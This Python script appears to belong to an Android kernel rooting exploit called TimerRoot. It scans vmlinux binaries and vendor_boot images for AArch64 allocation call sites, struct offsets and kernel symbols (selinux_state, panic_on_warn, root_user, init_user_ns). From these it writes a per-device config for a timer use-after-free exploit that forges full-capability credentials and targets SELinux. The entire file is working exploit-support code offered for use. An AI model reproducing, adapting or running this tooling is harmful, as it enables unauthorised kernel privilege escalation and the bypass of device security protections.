#!/usr/bin/env python3
"""
Derives TimerRoot conf constants from vmlinux.elf + vendor_boot.img.
Uses AArch64 binary scan to find timer_site and copy_process_low21 even
when do_timer_create / dup_task_struct are inlined by LTO+PGO.
"""

import struct
import re
import sys
import os
import argparse
import subprocess
import tempfile
from pathlib import Path


# ---------------------------------------------------------------------------
# ELF64 binary parser
# ---------------------------------------------------------------------------

class ElfSection:
    def __init__(self, name, vaddr, data):
        self.name = name
        self.vaddr = vaddr
        self.size = len(data)
        self.data = data

    def contains(self, va):
        return self.vaddr <= va < self.vaddr + self.size

    def off(self, va):
        return (va - self.vaddr) if self.contains(va) else None


class ElfBinary:
    def __init__(self, path):
        self.sections = []
        with open(path, 'rb') as f:
            raw = f.read()
        if raw[:4] != b'\x7fELF' or raw[4] != 2:
            raise ValueError("Not a 64-bit ELF")
        e_shoff     = struct.unpack_from('<Q', raw, 40)[0]
        e_shentsize = struct.unpack_from('<H', raw, 58)[0]
        e_shnum     = struct.unpack_from('<H', raw, 60)[0]
        e_shstrndx  = struct.unpack_from('<H', raw, 62)[0]
        ss_hdr = e_shoff + e_shstrndx * e_shentsize
        ss_off  = struct.unpack_from('<Q', raw, ss_hdr + 24)[0]
        ss_sz   = struct.unpack_from('<Q', raw, ss_hdr + 32)[0]
        strtab  = raw[ss_off:ss_off + ss_sz]

        def sname(n):
            end = strtab.find(b'\x00', n)
            return strtab[n:end].decode('ascii', errors='replace') if end >= 0 else ''

        for i in range(e_shnum):
            hdr     = e_shoff + i * e_shentsize
            sh_name = struct.unpack_from('<I', raw, hdr)[0]
            sh_va   = struct.unpack_from('<Q', raw, hdr + 16)[0]
            sh_off  = struct.unpack_from('<Q', raw, hdr + 24)[0]
            sh_sz   = struct.unpack_from('<Q', raw, hdr + 32)[0]
            if sh_sz == 0 or sh_va == 0:
                continue
            self.sections.append(ElfSection(sname(sh_name), sh_va, raw[sh_off:sh_off + sh_sz]))

    def va_read(self, va, size):
        for s in self.sections:
            o = s.off(va)
            if o is not None and o + size <= s.size:
                return s.data[o:o + size]
        return None

    def find_string(self, text):
        """Find null-terminated string in read-only sections, return list of VAs.
        Also searches '.kernel' (vmlinux-to-elf single-section reconstruction)."""
        needle = text.encode('ascii') + b'\x00'
        vas = []
        for s in self.sections:
            if not ('rodata' in s.name or 'str' in s.name or s.name in
                    ('__ksymtab_strings', '.init.rodata', '.text.str', '.kernel')):
                continue
            pos = 0
            while True:
                p = s.data.find(needle, pos)
                if p < 0:
                    break
                vas.append(s.vaddr + p)
                pos = p + 1
        return vas

    def text_insns(self):
        """Yield (va, insn_u32) for all .text instructions.
        Also handles vmlinux-to-elf output which uses a single '.kernel' section."""
        for s in self.sections:
            if not (s.name.startswith('.text') or s.name == '.init.text'
                    or s.name == '.kernel'):
                continue
            for i in range(0, s.size - 3, 4):
                yield (s.vaddr + i, struct.unpack_from('<I', s.data, i)[0])

    def insns_before(self, va, n=32):
        """Return list of (va, insn) for the n instructions before va (oldest first)."""
        for s in self.sections:
            o = s.off(va)
            if o is None:
                continue
            start = max(0, o - n * 4) & ~3
            return [(s.vaddr + i, struct.unpack_from('<I', s.data, i)[0])
                    for i in range(start, o, 4)]
        return []

    def insns_at(self, va, n=20):
        """Return list of (va, insn) starting at va."""
        for s in self.sections:
            o = s.off(va)
            if o is None:
                continue
            result = []
            for i in range(n):
                if o + i * 4 + 4 > s.size:
                    break
                result.append((va + i * 4, struct.unpack_from('<I', s.data, o + i * 4)[0]))
            return result
        return []


# ---------------------------------------------------------------------------
# AArch64 instruction decoders
# ---------------------------------------------------------------------------

def _bl_dest(pc, insn):
    """Return destination of bl/b instruction, or None."""
    if (insn >> 26) not in (0x25, 0x05):
        return None
    imm = insn & 0x3FFFFFF
    if imm & (1 << 25):
        imm -= (1 << 26)
    return (pc + imm * 4) & 0xFFFFFFFFFFFFFFFF


def _adrp(pc, insn):
    """Return (rd, page_va) for adrp, or None."""
    if (insn & 0x9F000000) != 0x90000000:
        return None
    rd    = insn & 0x1F
    immhi = (insn >> 5) & 0x7FFFF
    immlo = (insn >> 29) & 0x3
    imm   = (immhi << 2 | immlo) << 12
    if imm & (1 << 32):
        imm -= (1 << 33)
    return (rd, ((pc & ~0xFFF) + imm) & 0xFFFFFFFFFFFFFFFF)


def _ldr_x(insn):
    """Return (rd, rn, off) for ldr Xd,[Xn,#uimm12<<3], or None."""
    if (insn & 0xFFC00000) != 0xF9400000:
        return None
    return (insn & 0x1F, (insn >> 5) & 0x1F, ((insn >> 10) & 0xFFF) * 8)


def _str_x(insn):
    """Return (rt, rn, off) for str Xt,[Xn,#uimm12<<3], or None."""
    if (insn & 0xFFC00000) != 0xF9000000:
        return None
    return (insn & 0x1F, (insn >> 5) & 0x1F, ((insn >> 10) & 0xFFF) * 8)


def _add_imm(insn):
    """Return (rd, rn, imm) for add Xd,Xn,#imm12, or None."""
    if (insn & 0x7FC00000) != 0x11000000:
        return None
    rd  = insn & 0x1F
    rn  = (insn >> 5) & 0x1F
    imm = (insn >> 10) & 0xFFF
    if (insn >> 22) & 3 == 1:
        imm <<= 12
    return (rd, rn, imm)


def _mov_reg(insn):
    """Return (rd, rm) for mov Xd,Xm (orr Xd,XZR,Xm), or None."""
    if (insn & 0xFFE0FFE0) == 0xAA0003E0:
        return (insn & 0x1F, (insn >> 16) & 0x1F)
    return None


def _is_alloc_tag(insns):
    """Return True if any instruction looks like alloc-tag path (mrs Xn, SP_EL0)."""
    for _, w in insns:
        if (w & 0xFFFFF01F) == 0xD5384100:  # mrs Xn, SP_EL0
            return True
    return False


# ---------------------------------------------------------------------------
# x0 register tracing (backward dataflow, oldest-first insn list)
# ---------------------------------------------------------------------------

def _trace_reg(insns, reg, depth=0):
    """
    Scan insns (oldest first) backward to determine what `reg` holds.
    Returns:
      ('ptr',  global_va)   – loaded via adrp+ldr from global_va
      ('addr', string_va)   – loaded via adrp+add (direct address)
      None                  – could not determine
    """
    if depth > 3:
        return None
    for i in range(len(insns) - 1, -1, -1):
        va, insn = insns[i]

        # Case 1: adrp Xreg, PAGE  → look forward for ldr/add on the same reg
        ap = _adrp(va, insn)
        if ap and ap[0] == reg:
            page = ap[1]
            for j in range(i + 1, min(i + 8, len(insns))):
                _, ni = insns[j]
                lx = _ldr_x(ni)
                if lx and lx[1] == reg:
                    return ('ptr', page + lx[2])
                ax = _add_imm(ni)
                if ax and ax[1] == reg:
                    return ('addr', page + ax[2])
            return None

        # Case 2: ldr Xreg, [Xrn, #off]  → find adrp Xrn
        lx = _ldr_x(insn)
        if lx and lx[0] == reg:
            rn = lx[1]
            for k in range(i - 1, max(i - 12, -1), -1):
                _, ki = insns[k]
                ap2 = _adrp(insns[k][0], ki)
                if ap2 and ap2[0] == rn:
                    return ('ptr', ap2[1] + lx[2])
            return None

        # Case 3: mov Xreg, Xrm  → recurse on rm
        mv = _mov_reg(insn)
        if mv and mv[0] == reg:
            return _trace_reg(insns[:i], mv[1], depth + 1)

    return None


# ---------------------------------------------------------------------------
# nm symbol table
# ---------------------------------------------------------------------------

def get_symbols(vmlinux_elf):
    result = subprocess.run(['nm', '--defined-only', '-n', vmlinux_elf],
                            capture_output=True, text=True)
    syms = {}
    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                syms[parts[-1]] = int(parts[0], 16)
            except ValueError:
                pass
    return syms


# ---------------------------------------------------------------------------
# Binary scan: locate the global that holds a named kmem_cache*
# ---------------------------------------------------------------------------

def _find_cachep_global_via_create(elf, symbols, cache_name):
    """
    Find VA of the global kmem_cache* for cache_name by locating the
    kmem_cache_create bl where x0 = string VA, then the str x0 that follows.
    Returns global VA or 0.
    """
    string_vas = elf.find_string(cache_name)
    if not string_vas:
        print(f"[!] string '{cache_name}' not found in rodata")
        return 0
    string_va = string_vas[0]
    print(f"[*] string '{cache_name}' at 0x{string_va:x}")

    create_addrs = set()
    for name in ('kmem_cache_create', 'kmem_cache_create_usercopy'):
        if name in symbols:
            create_addrs.add(symbols[name])
    if not create_addrs:
        print("[!] kmem_cache_create symbol not found in kallsyms")
        return 0

    for pc, insn in elf.text_insns():
        dest = _bl_dest(pc, insn)
        if dest not in create_addrs:
            continue
        window = elf.insns_before(pc, 24)
        r = _trace_reg(window, 0)
        if not r or r[0] != 'addr':
            continue
        if abs(r[1] - string_va) > 8:  # allow minor misalignment
            continue

        # Found the create call; find str x0/x1 after it
        after = elf.insns_at(pc + 4, 20)
        # Also tolerate mov x1, x0 followed by str x1
        x0_reg = 0
        for j, (npc, ni) in enumerate(after):
            # Check for str of whatever register holds the cache ptr
            sx = _str_x(ni)
            if sx and sx[0] == x0_reg:
                # Find adrp for sx[1] (rn)
                rn = sx[1]
                # Look in after[:j] and window[-8:] for adrp rn
                candidates = after[:j] + window[-10:]
                for kpc, ki in reversed(candidates):
                    ap = _adrp(kpc, ki)
                    if ap and ap[0] == rn:
                        gva = ap[1] + sx[2]
                        print(f"[+] cachep global for '{cache_name}': 0x{gva:x}")
                        return gva
            # Track register moves: mov xN, x0
            mv = _mov_reg(ni)
            if mv and mv[1] == x0_reg:
                x0_reg = mv[0]
            # Also handle explicit ldr of return value elsewhere - stop at next call
            if _bl_dest(npc, ni) is not None:
                break

    print(f"[!] cachep global not found for '{cache_name}'")
    return 0


def find_cachep_global(elf, symbols, cache_name):
    """Return VA of the global kmem_cache* pointer, or 0."""
    # Check kallsyms first (fastest)
    cachep_sym = {'posix_timers_cache': 'posix_timers_cache',
                  'task_struct': 'task_struct_cachep'}.get(cache_name, '')
    if cachep_sym and cachep_sym in symbols:
        va = symbols[cachep_sym]
        print(f"[*] {cachep_sym} from kallsyms: 0x{va:x}")
        return va
    return _find_cachep_global_via_create(elf, symbols, cache_name)


# ---------------------------------------------------------------------------
# Binary scan: find the kmem_cache_alloc call site for a cachep global
# ---------------------------------------------------------------------------

def find_alloc_site(elf, symbols, cachep_global_va, label):
    """
    Scan all bl kmem_cache_alloc* where x0 is loaded from cachep_global_va.
    Returns (bl + 4) for the first non-alloc-tag match, or 0.
    """
    alloc_addrs = set()
    for name in ('kmem_cache_alloc', 'kmem_cache_alloc_node',
                 'kmem_cache_alloc_lru', 'kmem_cache_alloc_bulk'):
        if name in symbols:
            alloc_addrs.add(symbols[name])
    if not alloc_addrs:
        print(f"[!] kmem_cache_alloc symbol not found")
        return 0

    for pc, insn in elf.text_insns():
        dest = _bl_dest(pc, insn)
        if dest not in alloc_addrs:
            continue
        window = elf.insns_before(pc, 24)
        if not window:
            continue
        if _is_alloc_tag(window[-15:]):
            continue
        r = _trace_reg(window, 0)
        if not r or r[0] != 'ptr':
            continue
        if r[1] != cachep_global_va:
            continue
        print(f"[+] alloc site for {label}: bl at 0x{pc:x}, site 0x{pc+4:x}")
        return pc + 4

    print(f"[!] alloc site not found for {label}")
    return 0


# ---------------------------------------------------------------------------
# High-level finders
# ---------------------------------------------------------------------------

def find_timer_site(elf, symbols):
    cachep_va = find_cachep_global(elf, symbols, 'posix_timers_cache')
    if not cachep_va:
        return 0
    return find_alloc_site(elf, symbols, cachep_va, 'posix_timers_cache')


def find_copy_process_low21(elf, symbols):
    cachep_va = find_cachep_global(elf, symbols, 'task_struct')
    if not cachep_va:
        return 0
    site = find_alloc_site(elf, symbols, cachep_va, 'task_struct_cachep')
    return (site & 0x1FFFFF) if site else 0


# ---------------------------------------------------------------------------
# BTF struct offsets
# ---------------------------------------------------------------------------

def get_btf_structs(vmlinux_elf):
    result = subprocess.run(['bpftool', 'btf', 'dump', 'file', vmlinux_elf],
                            capture_output=True, text=True)
    if result.returncode != 0 or not result.stdout.strip():
        return {}
    structs = {}
    current, cur_size, cur_fields = None, 0, {}
    for line in result.stdout.splitlines():
        m = re.match(r'\[\d+\] STRUCT \'(\w+)\' size=(\d+)', line)
        if m:
            if current:
                structs[current] = {'__size__': cur_size, **cur_fields}
            current, cur_size, cur_fields = m.group(1), int(m.group(2)), {}
            continue
        m = re.match(r"\s+'(\w+)' type_id=\d+ bits_offset=(\d+)", line)
        if m and current:
            cur_fields[m.group(1)] = int(m.group(2)) // 8
            continue
        if re.match(r'\[\d+\]', line) and current:
            structs[current] = {'__size__': cur_size, **cur_fields}
            current, cur_fields = None, {}
    if current:
        structs[current] = {'__size__': cur_size, **cur_fields}
    return structs


# ---------------------------------------------------------------------------
# vendor_boot: android_arch_task_struct_size
# ---------------------------------------------------------------------------

def get_vendor_ext(vendor_boot_img):
    if not vendor_boot_img or not os.path.exists(vendor_boot_img):
        return 0
    with tempfile.TemporaryDirectory() as tmpdir:
        subprocess.run(['unpack_bootimg', '--boot_img', vendor_boot_img,
                        '--out', tmpdir, '--format', 'mkbootimg'],
                       capture_output=True)
        for fname in os.listdir(tmpdir):
            fpath = os.path.join(tmpdir, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, 'r', errors='ignore') as f:
                    content = f.read()
                m = re.search(r'android_arch_task_struct_size=(\d+)', content)
                if m:
                    val = int(m.group(1))
                    print(f"[+] android_arch_task_struct_size={val}")
                    return val
            except Exception:
                pass
    return 0


# ---------------------------------------------------------------------------
# selinux blob offset
# ---------------------------------------------------------------------------

def find_selinux_blob_off(symbols):
    """
    If landlock_blob_sizes is present, landlock contributes a cred blob,
    and selinux's blob follows after alignment. For GKI android14-6.1
    without landlock, offset = 0.
    """
    if 'landlock_blob_sizes' not in symbols:
        print("[+] selinux_blob_off = 0x0 (no landlock)")
        return 0
    # landlock lbs_cred is typically 8 bytes; selinux comes after → 8
    print("[+] selinux_blob_off = 0x8 (landlock present)")
    return 8


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _kmi(release):
    m = re.search(r'android(\d+)-(\d+\.\d+)', release)
    if m:
        return f"android{m.group(1)}-{m.group(2)}"
    if re.match(r'^6\.1\.', release):
        return "android14-6.1"
    if re.match(r'^6\.6\.', release):
        return "android15-6.6"
    if re.match(r'^5\.15\.', release):
        return "android13-5.15"
    return "android14-6.1"


def _default_cred_off(release):
    """task_struct.cred offset: 0x838 for 6.1+, 0x798 for 5.15."""
    if re.match(r'^5\.15\.', release):
        return 0x798
    return 0x838  # 6.1 and 6.6


def _default_task_alloc(release):
    if re.match(r'^5\.15\.', release):
        return 0x1200
    return 0x12C0  # 6.1 / 6.6 Android GKI


# ---------------------------------------------------------------------------
# Main derivation
# ---------------------------------------------------------------------------

def derive_conf(vmlinux_elf, vendor_boot_img, release, page_size, device_name):
    print(f"\n=== Deriving conf for {device_name or release} ===\n")

    print("[*] Loading kallsyms...")
    syms = get_symbols(vmlinux_elf)
    print(f"    {len(syms)} symbols")

    print("[*] Parsing ELF binary (AArch64 scan)...")
    elf = ElfBinary(vmlinux_elf)

    print("[*] Reading BTF via bpftool...")
    try:
        btf = get_btf_structs(vmlinux_elf)
        print(f"    {len(btf)} structs")
    except Exception as e:
        print(f"[warn] BTF unavailable: {e}")
        btf = {}

    # --- critical call sites ---
    print("[*] Finding timer_site...")
    timer_site = find_timer_site(elf, syms)
    if not timer_site:
        print("[warn] timer_site = 0x0 (manual disassembly required)", file=sys.stderr)

    print("[*] Finding copy_process_low21...")
    cp_low21 = find_copy_process_low21(elf, syms)
    if not cp_low21:
        print("[warn] copy_process_low21 = 0x0 (manual disassembly required)", file=sys.stderr)

    # --- cred layout (BTF if available, else 6.1 defaults) ---
    cred   = btf.get('cred', {})
    task_s = btf.get('task_struct', {})
    kit    = btf.get('k_itimer', {})

    cred_req          = 0xB0
    cred_alloc        = 0xC0   # slab rounds 0xb0 up to 0xc0 with HWCACHE_ALIGN
    cred_size         = cred.get('__size__', 0xB0)
    cred_uid_off      = cred.get('uid',          0x04)
    cred_euid_off     = cred.get('euid',         0x14)
    cred_cap_off      = cred.get('cap_inheritable', cred.get('cap_permitted', 0x28))
    cred_cap_count    = 5
    cred_security_off = cred.get('security',     0x78)
    cred_user_off     = cred.get('user',         0x80)
    cred_userns_off   = cred.get('user_ns',      0x88)
    cred_ucounts_off  = cred.get('ucounts',      0x90)
    cred_group_off    = cred.get('group_info',   0x98)
    fake_cred_off     = 0x18

    # --- task_struct ---
    task_cred_off = task_s.get('cred', _default_cred_off(release))
    base_sz       = task_s.get('__size__', _default_task_alloc(release))

    # vendor extension (android_arch_task_struct_size overrides base)
    vext = get_vendor_ext(vendor_boot_img)
    task_alloc_bytes = (vext if vext else base_sz + 0)
    # keep it aligned
    task_alloc_bytes = (task_alloc_bytes + 63) & ~63

    # --- timer struct ---
    timer_alloc    = kit.get('__size__', 0x108)
    timer_node_off = kit.get('it',       0x78)

    # --- kernel global symbols ---
    def sym(name):
        v = syms.get(name, 0)
        if not v:
            print(f"[!] symbol not found: {name}")
        return v

    selinux_state = sym('selinux_state')
    panic_on_warn = sym('panic_on_warn')
    root_user     = sym('root_user')
    init_user_ns  = sym('init_user_ns')
    init_ucounts  = sym('init_ucounts')
    init_groups   = sym('init_groups')

    selinux_blob_off = find_selinux_blob_off(syms)
    pcp_free = 1 if re.match(r'^(5\.15|6\.1\.)', release) else 0
    page_shift = {4096: 12, 16384: 14, 65536: 16}.get(page_size, 12)

    return {
        'release':         release,
        'ksu_kmi':         _kmi(release),
        'page_size':       page_size,
        'page_shift':      page_shift,
        'slab_order':      1,
        'slab_size':       8192,
        'linear_min':      0xFFFFFF0000000000,
        'linear_max':      0xFFFFFFC000000000,
        'pcp_free':        pcp_free,
        'timer_site':      timer_site,
        'timer_alloc':     timer_alloc,
        'timer_node_off':  timer_node_off,
        'copy_process_low21': cp_low21,
        'task_alloc_bytes':   task_alloc_bytes,
        'task_cred_off':      task_cred_off,
        'cred_req':           cred_req,
        'cred_alloc':         cred_alloc,
        'cred_size':          cred_size,
        'cred_uid_off':       cred_uid_off,
        'cred_euid_off':      cred_euid_off,
        'cred_cap_off':       cred_cap_off,
        'cred_cap_count':     cred_cap_count,
        'cred_security_off':  cred_security_off,
        'cred_user_off':      cred_user_off,
        'cred_userns_off':    cred_userns_off,
        'cred_ucounts_off':   cred_ucounts_off,
        'cred_group_off':     cred_group_off,
        'fake_cred_off':      fake_cred_off,
        'selinux_state':      selinux_state,
        'panic_on_warn':      panic_on_warn,
        'root_user':          root_user,
        'init_user_ns':       init_user_ns,
        'init_ucounts':       init_ucounts,
        'init_groups':        init_groups,
        'selinux_blob_off':   selinux_blob_off,
        'selinux_sid_kernel': 1,
        'fullcap':            0x1FFFFFFFFFF,
    }


# ---------------------------------------------------------------------------
# Write conf (format matching reference confs exactly)
# ---------------------------------------------------------------------------

def write_conf(conf, output_path, device_name):
    r  = conf['release']
    ps = conf['page_size']

    h16 = lambda v: f'0x{v:016x}'
    hx  = lambda v: f'0x{v:x}'

    lines = [
        f'# TimerUAF kernel profile (HOCON; JSON remains valid)',
        f'# Device: {device_name or "Unknown"}',
        f'# Kernel: {r} ({ps // 1024}K pages)',
        f'# Auto-derived by scripts/derive_conf.py',
        f'#',
        f'release = "{r}"',
        f'schema_version = 1',
        f'ksu_kmi = "{conf["ksu_kmi"]}"',
        '',
        f'page_size = {ps}',
        f'page_shift = {conf["page_shift"]}',
        f'slab_order = {conf["slab_order"]}',
        f'slab_size = {conf["slab_size"]}',
        f'linear_min = {h16(conf["linear_min"])}',
        f'linear_max = {h16(conf["linear_max"])}',
        '',
    ]
    if conf.get('pcp_free'):
        lines += [f'pcp_free = 1', '']

    lines += [
        f'# kmem_cache_alloc(posix_timers_cache) return address',
        f'timer_site = {h16(conf["timer_site"])}',
        f'timer_alloc = {hx(conf["timer_alloc"])}',
        f'timer_node_off = {hx(conf["timer_node_off"])}',
        '',
        f'# cred_jar: kmem_cache_create("cred_jar", {hx(conf["cred_req"])}, ...)',
        f'cred_req = {hx(conf["cred_req"])}',
        f'cred_alloc = {hx(conf["cred_alloc"])}',
        f'cred_size = {hx(conf["cred_size"])}',
        f'cred_uid_off = {hx(conf["cred_uid_off"])}',
        f'cred_euid_off = {hx(conf["cred_euid_off"])}',
        f'cred_cap_off = {hx(conf["cred_cap_off"])}',
        f'cred_cap_count = {conf["cred_cap_count"]}',
        f'cred_security_off = {hx(conf["cred_security_off"])}',
        f'cred_user_off = {hx(conf["cred_user_off"])}',
        f'cred_userns_off = {hx(conf["cred_userns_off"])}',
        f'cred_ucounts_off = {hx(conf["cred_ucounts_off"])}',
        f'cred_group_off = {hx(conf["cred_group_off"])}',
        f'fake_cred_off = {hx(conf["fake_cred_off"])}',
        '',
        f'# link-time symbols (kallsyms)',
        f'selinux_state = {h16(conf["selinux_state"])}',
        f'panic_on_warn = {h16(conf["panic_on_warn"])}',
        '',
        f'# task_struct / cred layout',
        f'task_cred_off = {hx(conf["task_cred_off"])}',
        f'copy_process_low21 = {hx(conf["copy_process_low21"])}',
        f'task_alloc_bytes = {hx(conf["task_alloc_bytes"])}',
        '',
        f'# capability and fake-cred refcounted sub-objects',
        f'fullcap = {hx(conf["fullcap"])}',
        f'root_user = {h16(conf["root_user"])}',
        f'init_user_ns = {h16(conf["init_user_ns"])}',
        f'init_ucounts = {h16(conf["init_ucounts"])}',
        f'init_groups = {h16(conf["init_groups"])}',
        '',
        f'# task_security_struct',
        f'selinux_blob_off = {hx(conf["selinux_blob_off"])}',
        f'selinux_sid_kernel = {conf["selinux_sid_kernel"]}',
    ]

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    Path(output_path).write_text('\n'.join(lines) + '\n')
    print(f"\n[+] Wrote {output_path}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='Derive TimerRoot conf from vmlinux.elf')
    ap.add_argument('--vmlinux',     required=True)
    ap.add_argument('--vendor-boot', default=None)
    ap.add_argument('--release',     required=True)
    ap.add_argument('--page-size',   default=4096, type=int)
    ap.add_argument('--device',      default='')
    ap.add_argument('--output',      required=True)
    args = ap.parse_args()

    conf = derive_conf(args.vmlinux, args.vendor_boot, args.release,
                       args.page_size, args.device)
    write_conf(conf, args.output, args.device)
    print("\nDone. Verify F1 (begin_new_exec order) and run:")
    print(f"  ./timer --conf {args.output} selfcheck")
